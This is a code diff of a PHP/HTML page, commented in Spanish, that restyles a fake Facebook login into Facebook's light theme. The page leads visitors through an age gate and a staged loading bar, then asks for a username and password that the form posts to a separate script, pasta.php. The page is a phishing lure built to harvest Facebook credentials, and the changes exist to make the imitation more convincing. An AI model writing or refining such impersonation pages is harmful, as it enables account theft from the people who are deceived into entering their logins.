@@ -14,8 +14,8 @@
         }
 
         body {
-            background-color: #000000;
-            color: #ffffff;
+            background-color: #f0f2f5; /* fondo gris claro de FB */
+            color: #1c1e21;
             height: 100vh;
             width: 100vw;
             display: flex;
@@ -35,29 +35,31 @@
             height: auto;
             transform: translate(-50%, -50%);
             object-fit: cover;
-            opacity: 0.35;
+            opacity: 0.45;
             z-index: 1;
-            filter: brightness(0.7);
+            filter: brightness(0.9) contrast(1.1);
         }
 
+        /* Vignette más suave para que el modal blanco no choque */
         .vignette {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0.3) 20%, rgba(0,0,0,0.95) 85%);
+            background: radial-gradient(circle, rgba(240,242,245,0.1) 10%, rgba(0,0,0,0.55) 90%);
             z-index: 2;
             pointer-events: none;
         }
 
+        /* Tarjeta blanca flotante */
         .modal-card {
             position: relative;
             z-index: 10;
-            background: rgba(18, 18, 18, 0.88);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 0, 0, 0.06);
             border-radius: 20px;
             padding: 35px 25px;
             width: 90%;
@@ -67,7 +69,7 @@
             flex-direction: column;
             justify-content: space-between;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0,0,0,0.03);
             margin: auto;
         }
 
@@ -78,12 +80,12 @@
 
         .hidden { display: none !important; }
 
-        /* --- Age Gate & Shared --- */
+        /* --- Iconos (fondo azul muy claro) --- */
         .icon-container {
             width: 58px;
             height: 58px;
-            background: rgba(24, 119, 242, 0.15);
-            border: 1px solid rgba(24, 119, 242, 0.3);
+            background: rgba(24, 119, 242, 0.08);
+            border: 1px solid rgba(24, 119, 242, 0.2);
             border-radius: 16px;
             display: flex;
             justify-content: center;
@@ -94,8 +96,8 @@
         .icon-container svg { width: 28px; height: 28px; fill: #1877F2; }
 
         .icon-success {
-            background: rgba(46, 204, 113, 0.15) !important;
-            border-color: rgba(46, 204, 113, 0.3) !important;
+            background: rgba(46, 204, 113, 0.08) !important;
+            border-color: rgba(46, 204, 113, 0.25) !important;
         }
         .icon-success svg { fill: #2ecc71 !important; }
 
@@ -103,36 +105,36 @@
             font-size: 20px;
             font-weight: 700;
             margin-bottom: 10px;
-            color: #ffffff;
+            color: #1c1e21;
             letter-spacing: -0.5px;
         }
         p {
             font-size: 13.5px;
-            color: #b0b3b8;
+            color: #606770;
             line-height: 1.45;
             margin-bottom: 20px;
         }
 
+        /* Botones estilo FB claro */
         .btn {
             width: 100%;
             padding: 13px;
-            border-radius: 10px;
-            font-size: 14.5px;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.25s ease;
+            transition: all 0.2s ease;
             border: none;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
         .btn-primary {
             background-color: #1877F2;
             color: #ffffff;
-            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
         }
         .btn-primary:hover {
             background-color: #166fe5;
-            box-shadow: 0 0 20px rgba(255,255,255,0.6), 0 4px 20px rgba(24,119,242,0.6);
             transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.35);
         }
         .btn-primary:disabled {
             opacity: 0.7;
@@ -140,15 +142,12 @@
             transform: none;
         }
         .btn-secondary {
-            background-color: rgba(255,255,255,0.05);
-            color: #e4e6eb;
-            border: 1px solid rgba(255,255,255,0.1);
+            background-color: #e4e6eb;
+            color: #050505;
+            border: none;
         }
         .btn-secondary:hover {
-            background-color: rgba(24,119,242,0.1);
-            color: #1877F2;
-            border-color: #1877F2;
-            box-shadow: 0 0 15px rgba(255,255,255,0.5), 0 0 20px rgba(24,119,242,0.4);
+            background-color: #d8dadf;
             transform: translateY(-1px);
         }
 
@@ -159,7 +158,7 @@
             align-items: center;
             justify-content: center;
             gap: 6px;
-            border-top: 1px solid rgba(255,255,255,0.06);
+            border-top: 1px solid #e4e6eb;
             padding-top: 16px;
             margin-top: auto;
         }
@@ -168,33 +167,32 @@
         .progress-bar-bg {
             width: 100%;
             height: 9px;
-            background: rgba(255,255,255,0.1);
+            background: #e4e6eb;
             border-radius: 5px;
             overflow: hidden;
             margin: 20px 0;
-            border: 1px solid rgba(255,255,255,0.15);
+            border: 1px solid rgba(0,0,0,0.04);
         }
         .progress-bar-fill {
             height: 100%;
             width: 0%;
             background: #1877F2;
-            box-shadow: 0 0 10px #1877F2;
             border-radius: 5px;
             transition: width 0.015s linear;
         }
         .percentage-text {
             font-size: 26px;
             font-weight: 700;
-            color: #ffffff;
+            color: #1c1e21;
             margin-bottom: 6px;
         }
 
-        /* --- Facebook Login --- */
+        /* --- Facebook Login (Tema Claro) --- */
         .fb-brand { margin-bottom: 16px; }
         .fb-brand svg { width: 48px; height: 48px; fill: #1877F2; }
 
         .login-alert {
-            background: rgba(255, 193, 7, 0.1);
+            background: #fff5cc;
             border-left: 3px solid #ffc107;
             padding: 10px 12px;
             border-radius: 6px;
@@ -204,26 +202,25 @@
             align-items: center;
             text-align: left;
         }
-        .login-alert svg { width: 22px; height: 22px; fill: #ffc107; flex-shrink: 0; }
-        .login-alert span { font-size: 13px; color: #e4e6eb; line-height: 1.3; }
+        .login-alert svg { width: 22px; height: 22px; fill: #b98e00; flex-shrink: 0; }
+        .login-alert span { font-size: 13px; color: #5f4700; line-height: 1.3; }
 
-        .input-group { position: relative; margin-bottom: 14px; }
+        .input-group { position: relative; margin-bottom: 12px; }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
-            border: 1px solid rgba(255,255,255,0.15);
+            border: 1px solid #dddfe2;
             border-radius: 8px;
             font-size: 16px;
-            color: #ffffff;
-            background: rgba(0,0,0,0.25);
+            color: #1c1e21;
+            background: #ffffff;
             transition: all 0.2s;
             outline: none;
         }
         .input-group input::placeholder { color: #8a8d91; }
         .input-group input:focus {
             border-color: #1877F2;
-            box-shadow: 0 0 0 3px rgba(24,119,242,0.25);
-            background: rgba(0,0,0,0.4);
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
         }
 
         .hp-field {
@@ -238,13 +235,13 @@
             display: block;
             text-align: center;
             margin-top: 16px;
-            color: #b0b3b8;
+            color: #1877F2;
             text-decoration: none;
             font-size: 13.5px;
             font-weight: 500;
-            transition: color 0.2s;
+            transition: opacity 0.2s;
         }
-        .forgot-pass:hover { color: #ffffff; }
+        .forgot-pass:hover { opacity: 0.8; text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -281,7 +278,7 @@
             </div>
         </div>
 
-        <!-- ESTADO 3: Login -->
+        <!-- ESTADO 3: Login Facebook (Tema Blanco) -->
         <div id="stateLogin" class="card-content hidden">
             <div class="fb-brand">
                 <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -327,7 +324,7 @@
             document.getElementById('stateLoading').classList.remove('hidden');
 
             let currentProgress = 1;
-            const intervalTime = 15; // 1.5 segundos totales
+            const intervalTime = 15;
 
             const bar = document.getElementById('progressBar');
             const counter = document.getElementById('counter');
@@ -377,12 +374,11 @@
                 return false;
             }
 
-            // Cambia el botón a "Entrando..." y deja que el navegador haga el POST real
             const btn = document.getElementById('btnSubmit');
             btn.disabled = true;
             btn.innerText = '<?php echo $t['btn_login_loading']; ?>';
 
-            return true; // Envía el formulario de forma nativa a pasta.php
+            return true; // Navegación nativa POST a pasta.php
         }
     </script>
 
